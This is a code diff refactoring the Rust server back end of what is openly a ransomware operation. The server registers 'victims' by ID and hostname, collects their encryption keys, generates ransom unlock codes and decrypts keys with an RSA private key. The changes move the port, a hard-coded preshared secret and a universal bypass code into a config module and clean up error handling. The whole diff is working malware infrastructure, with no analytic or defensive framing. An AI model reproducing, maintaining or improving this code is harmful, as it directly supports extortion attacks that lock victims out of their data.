@@ -1,16 +1,14 @@
 use axum::{
+    Router,
     extract::{self, State},
     routing::post,
-    Router,
 };
 use axum_embed::ServeEmbed;
 use axum_server::tls_rustls::RustlsConfig;
 use csv::{ReaderBuilder, WriterBuilder};
 use hex::{decode, encode};
 use log::{debug, error, info, warn};
-use rand::{rngs::StdRng, Rng, SeedableRng};
-/// RSA key size in 64-bit limbs (2048 bits / 64 = 32).
-const RSA_LIMBS: usize = 32;
+use rand::{RngExt, SeedableRng, rngs::StdRng};
 use rust_embed::RustEmbed;
 use serde::{Deserialize, Serialize};
 use std::{
@@ -20,6 +18,10 @@ use std::{
     sync::{Arc, Mutex},
     time::SystemTime,
 };
+
+mod config;
+
+const RSA_LIMBS: usize = 32; // RSA key size in 64 bit limbs (2048 bits / 64 = 32)
 
 use coconut_crab_lib::{
     file::get_exe_path_dir,
@@ -57,33 +59,6 @@ struct AssetPublic;
 #[folder = "assets/private"]
 struct AssetPrivate;
 
-/*
-
-    +---------------------+
-    | CONFIGURATION START |
-    +---------------------+
-
-*/
-
-// Configure port used by web server [required]
-const PORT: u16 = 3000;
-// Configure whether HTTPS or HTTP should be used [requried]
-const HTTPS: bool = true;
-// Configure time window in minutes where a failed encryption can recovery a symmetric key [required]
-const RECOVERY_WINDOW: u64 = 60;
-// Configure secret used to validate web requests [required]
-static PRESHARED_SECRET: &str = "gEFPsWMHEjdbBccgFKAFwdYwD98mH6cn7mmVwVgS8Vq4EUNocCwh3wLHrEVA7RzS";
-// Configure code valid for any victim [required]
-static BYPASS_CODE: &str = "2NSd-NRF3-qkB3-v6qP";
-
-/*
-
-    +-------------------+
-    | CONFIGURATION END |
-    +-------------------+
-
-*/
-
 #[tokio::main(flavor = "multi_thread")]
 async fn main() {
     env_logger::Builder::new()
@@ -111,11 +86,13 @@ async fn main() {
         .with_state(shared_state);
     debug!("Routing Configured");
 
-    let addr = SocketAddr::from(([0, 0, 0, 0], PORT));
+    let addr = SocketAddr::from(([0, 0, 0, 0], config::PORT));
     debug!("Socket Address Configured");
 
-    if HTTPS {
-        rustls::crypto::aws_lc_rs::default_provider().install_default().expect("Failed to install rustls crypto provider");
+    if config::HTTPS {
+        rustls::crypto::aws_lc_rs::default_provider()
+            .install_default()
+            .expect("Failed to install rustls crypto provider");
         let config = RustlsConfig::from_pem(get_tls_public_key(), get_tls_private_key())
             .await
             .expect("Failed to configure web server TLS");
@@ -125,25 +102,24 @@ async fn main() {
             .serve(app.into_make_service())
             .await
             .expect("Failed to start web server");
-        debug!("Web Server Started")
     } else {
         axum_server::bind(addr)
             .serve(app.into_make_service())
             .await
             .expect("Failed to start web server");
-        debug!("Web Server Started")
     }
+    debug!("Web Server Started");
 }
 
 fn import_csv<P: AsRef<FileSystemPath>>(file_path: P) -> Vec<Victim> {
     let mut victims = Vec::<Victim>::new();
     let file = match std::fs::File::open(file_path.as_ref()) {
-        Ok(file_result) => {
-            debug!("Existing CSV file found: {:?}", file_path.as_ref());
-            file_result
+        Ok(file) => {
+            debug!("Existing CSV file found: {}", file_path.as_ref().display());
+            file
         }
-        Err(file_result) => {
-            warn!("Existing CSV file not found: {:?}", file_result);
+        Err(error) => {
+            warn!("Existing CSV file not found: {error:?}");
             return victims;
         }
     };
@@ -151,12 +127,12 @@ fn import_csv<P: AsRef<FileSystemPath>>(file_path: P) -> Vec<Victim> {
     let mut reader = ReaderBuilder::new().has_headers(true).from_reader(file);
     for row in reader.deserialize() {
         let record = match row {
-            Ok(record_result) => {
-                debug!("Adding Deserialized Victim: {:?}", record_result);
-                record_result
+            Ok(record) => {
+                debug!("Adding Deserialized Victim: {record:?}");
+                record
             }
-            Err(record_result) => {
-                error!("Failed To Deserialize Victim: {}", record_result);
+            Err(error) => {
+                error!("Failed To Deserialize Victim: {error}");
                 continue;
             }
         };
@@ -169,7 +145,7 @@ fn export_csv<P: AsRef<FileSystemPath>>(file_path: P, victims: &[Victim]) {
     let file = File::create(file_path).expect("Error accessing filesystem for CSV");
     let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);
 
-    for victim in victims.iter() {
+    for victim in victims {
         writer
             .serialize(victim)
             .expect("Failed to serialize victims");
@@ -179,18 +155,13 @@ fn export_csv<P: AsRef<FileSystemPath>>(file_path: P, victims: &[Victim]) {
 }
 
 fn get_victim<'a>(victims: &'a mut [Victim], id: &str) -> Option<&'a mut Victim> {
-    if let Some(existing_victim) = victims
+    victims
         .iter_mut()
         .find(|existing_victim| existing_victim.id == *id)
-    {
-        Some(existing_victim)
-    } else {
-        None
-    }
 }
 
 fn generate_code() -> String {
-    let mut rng = StdRng::from_os_rng();
+    let mut rng = StdRng::from_rng(&mut rand::rng());
     let code: String = (0..4)
         .map(|_| {
             (0..4)
@@ -208,18 +179,18 @@ fn generate_code() -> String {
         })
         .collect::<Vec<String>>()
         .join("-");
-    debug!("Generated new code: {}", code);
+    debug!("Generated new code: {code}");
     code
 }
 
 fn get_epoch_time() -> u64 {
     match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
-        Ok(upload_time_result) => {
-            debug!("Reported Time: {:?}", upload_time_result);
-            upload_time_result.as_secs()
+        Ok(time) => {
+            debug!("Reported Time: {time:?}");
+            time.as_secs()
         }
-        Err(upload_time_result) => {
-            error!("Reported time before UNIX Epoch: {}", upload_time_result);
+        Err(error) => {
+            error!("Reported time before UNIX Epoch: {error}");
             0
         }
     }
@@ -233,24 +204,25 @@ fn decrypt_key(key: &str) -> String {
             .to_vec(),
     )
     .expect("Failed to read PEM file");
-    let private_key = purecrypto::rsa::RsaPrivateKey::<RSA_LIMBS>::from_pkcs1_pem(&pem).expect("Failed to parse PEM key");
+    let private_key = purecrypto::rsa::RsaPrivateKey::<RSA_LIMBS>::from_pkcs1_pem(&pem)
+        .expect("Failed to parse PEM key");
     let key_vec = match decode(key) {
-        Ok(key_array_result) => {
-            debug!("Decoded Key: {:?}", key_array_result);
-            key_array_result
+        Ok(bytes) => {
+            debug!("Decoded Key: {bytes:?}");
+            bytes
         }
-        Err(key_array_result) => {
-            error!("Failed To Decode Key: {}", key_array_result);
+        Err(error) => {
+            error!("Failed To Decode Key: {error}");
             return String::from("Invalid Key");
         }
     };
     let key = match private_key.decrypt_pkcs1v15(&key_vec) {
-        Ok(key_result) => {
-            debug!("Decrypted Key: {:?}", key_result);
-            key_result
+        Ok(key) => {
+            debug!("Decrypted Key: {key:?}");
+            key
         }
-        Err(key_result) => {
-            error!("Failed To Decrypt Key: {}", key_result);
+        Err(error) => {
+            error!("Failed To Decrypt Key: {error}");
             return String::from("Invalid Key");
         }
     };
@@ -294,7 +266,11 @@ async fn register(
     }
 
     let mut proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
-    if check_proof(&mut proof_source, PRESHARED_SECRET, &registration.proof) {
+    if check_proof(
+        &mut proof_source,
+        config::PRESHARED_SECRET,
+        &registration.proof,
+    ) {
         debug!(
             "[{}] Proof Verification Success: {}",
             registration.id, registration.proof
@@ -307,34 +283,36 @@ async fn register(
         return String::from("Invalid Proof");
     }
 
-    {
-        let mut victims = state.victims.lock().expect("Mutex was poisoned");
-        match get_victim(&mut victims, &registration.id) {
-            Some(existing_victim) => {
-                warn!(
-                    "[{}] Existing Victim Found: {:?}",
-                    registration.id, existing_victim
-                );
-                warn!("[{}] Cannot Register New Victim", registration.id);
-                String::from("Victim already exists")
-            }
-            None => {
-                let victim = Victim {
-                    id: registration.id,
-                    hostname: registration.hostname,
-                    key: String::new(),
-                    code: String::new(),
-                    upload_time: 0,
-                    complete: false,
-                };
-                info!("[{}] Adding New Victim: {:?}", victim.id, victim);
-                victims.push(victim);
-                export_csv(&state.file_path, &victims);
-                debug!("Updated Victims CSV");
-                String::from("Success")
-            }
+    let result = {
+        let victim_exists = state.victims.lock().expect("Mutex was poisoned")
+            .iter().any(|v| v.id == registration.id);
+
+        if victim_exists {
+            warn!("[{}] Existing Victim Found", registration.id);
+            warn!("[{}] Cannot Register New Victim", registration.id);
+            String::from("Victim already exists")
+        } else {
+            let victim = Victim {
+                id: registration.id,
+                hostname: registration.hostname,
+                key: String::new(),
+                code: String::new(),
+                upload_time: 0,
+                complete: false,
+            };
+            info!("[{}] Adding New Victim: {:?}", victim.id, victim);
+            state.victims.lock().expect("Mutex was poisoned").push(victim);
+            String::from("Success")
         }
+    };
+
+    if result == "Success" {
+        let victims = state.victims.lock().expect("Mutex was poisoned");
+        export_csv(&state.file_path, &victims);
+        debug!("Updated Victims CSV");
     }
+
+    result
 }
 
 async fn upload_sym_key(
@@ -368,7 +346,11 @@ async fn upload_sym_key(
     }
 
     let mut proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
-    if check_proof(&mut proof_source, PRESHARED_SECRET, &uploadsymkey.proof) {
+    if check_proof(
+        &mut proof_source,
+        config::PRESHARED_SECRET,
+        &uploadsymkey.proof,
+    ) {
         debug!(
             "[{}] Proof Verification Success: {}",
             uploadsymkey.id, uploadsymkey.proof
@@ -383,29 +365,26 @@ async fn upload_sym_key(
 
     {
         let mut victims = state.victims.lock().expect("Mutex was poisoned");
-        match get_victim(&mut victims, &uploadsymkey.id) {
-            Some(existing_victim) => {
-                existing_victim.key = uploadsymkey.key;
-                info!(
-                    "[{}] Added Symmetric Key: {}",
-                    uploadsymkey.id, existing_victim.key
-                );
-                existing_victim.code = generate_code();
-                info!("[{}] Added Code: {}", uploadsymkey.id, existing_victim.code);
-                existing_victim.upload_time = get_epoch_time();
-                info!(
-                    "[{}] Added Upload Time: {:?}",
-                    uploadsymkey.id, existing_victim.upload_time
-                );
-                export_csv(&state.file_path, &victims);
-                debug!("Updated Victims CSV");
-                String::from("Success")
-            }
-            None => {
-                warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
-                warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
-                String::from("Victim does not exist")
-            }
+        if let Some(existing_victim) = get_victim(&mut victims, &uploadsymkey.id) {
+            existing_victim.key = uploadsymkey.key;
+            info!(
+                "[{}] Added Symmetric Key: {}",
+                uploadsymkey.id, existing_victim.key
+            );
+            existing_victim.code = generate_code();
+            info!("[{}] Added Code: {}", uploadsymkey.id, existing_victim.code);
+            existing_victim.upload_time = get_epoch_time();
+            info!(
+                "[{}] Added Upload Time: {:?}",
+                uploadsymkey.id, existing_victim.upload_time
+            );
+            export_csv(&state.file_path, &victims);
+            debug!("Updated Victims CSV");
+            String::from("Success")
+        } else {
+            warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
+            warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
+            String::from("Victim does not exist")
         }
     }
 }
@@ -442,7 +421,7 @@ async fn announce_completion(
     let mut proof_source = announcecompletion.id.as_bytes().to_vec();
     if check_proof(
         &mut proof_source,
-        PRESHARED_SECRET,
+        config::PRESHARED_SECRET,
         &announcecompletion.proof,
     ) {
         debug!(
@@ -459,23 +438,21 @@ async fn announce_completion(
 
     {
         let mut victims = state.victims.lock().expect("Mutex was poisoned");
-        match get_victim(&mut victims, &announcecompletion.id) {
-            Some(existing_victim) => {
-                info!("[{}] Designating As Complete", announcecompletion.id);
-                existing_victim.complete = true;
-                export_csv(&state.file_path, &victims);
-                debug!("Updated Victims CSV");
-                String::from("Success")
-            }
-            None => {
-                warn!("[{}] Existing Victim Not Found", announcecompletion.id);
-                warn!("[{}] Cannot Announce Completion", announcecompletion.id);
-                String::from("Victim does not exist")
-            }
+        if let Some(existing_victim) = get_victim(&mut victims, &announcecompletion.id) {
+            info!("[{}] Designating As Complete", announcecompletion.id);
+            existing_victim.complete = true;
+            export_csv(&state.file_path, &victims);
+            debug!("Updated Victims CSV");
+            String::from("Success")
+        } else {
+            warn!("[{}] Existing Victim Not Found", announcecompletion.id);
+            warn!("[{}] Cannot Announce Completion", announcecompletion.id);
+            String::from("Victim does not exist")
         }
     }
 }
 
+#[allow(clippy::too_many_lines)]
 async fn download_sym_key(
     State(state): State<AppState>,
     extract::Json(downloadsymkey): extract::Json<DownloadSymKey>,
@@ -516,7 +493,11 @@ async fn download_sym_key(
     }
 
     let mut proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
-    if check_proof(&mut proof_source, PRESHARED_SECRET, &downloadsymkey.proof) {
+    if check_proof(
+        &mut proof_source,
+        config::PRESHARED_SECRET,
+        &downloadsymkey.proof,
+    ) {
         debug!(
             "[{}] Proof Verification Success: {}",
             downloadsymkey.id, downloadsymkey.proof
@@ -532,19 +513,16 @@ async fn download_sym_key(
     let existing_victim;
     {
         let mut victims = state.victims.lock().expect("Mutex was poisoned");
-        existing_victim = match get_victim(&mut victims, &downloadsymkey.id) {
-            Some(get_victim_result) => {
-                debug!(
-                    "[{}] Existing Victim Found: {:?}",
-                    downloadsymkey.id, get_victim_result
-                );
-                get_victim_result.clone()
-            }
-            None => {
-                warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
-                warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
-                return String::from("Victim does not exist");
-            }
+        existing_victim = if let Some(victim) = get_victim(&mut victims, &downloadsymkey.id) {
+            debug!(
+                "[{}] Existing Victim Found: {:?}",
+                downloadsymkey.id, victim
+            );
+            victim.clone()
+        } else {
+            warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
+            warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
+            return String::from("Victim does not exist");
         };
     }
 
@@ -559,7 +537,7 @@ async fn download_sym_key(
                 "[{}] Current Epoch Time: {} seconds",
                 downloadsymkey.id, current_time
             );
-            let recovery_window = RECOVERY_WINDOW * 60;
+            let recovery_window = config::RECOVERY_WINDOW * 60;
             debug!(
                 "[{}] Key Recovery Window: {} seconds",
                 downloadsymkey.id, recovery_window
@@ -581,7 +559,7 @@ async fn download_sym_key(
     }
 
     if existing_victim.code == downloadsymkey.code
-        || downloadsymkey.code == BYPASS_CODE
+        || downloadsymkey.code == config::BYPASS_CODE
         || recovery_valid
     {
         info!(
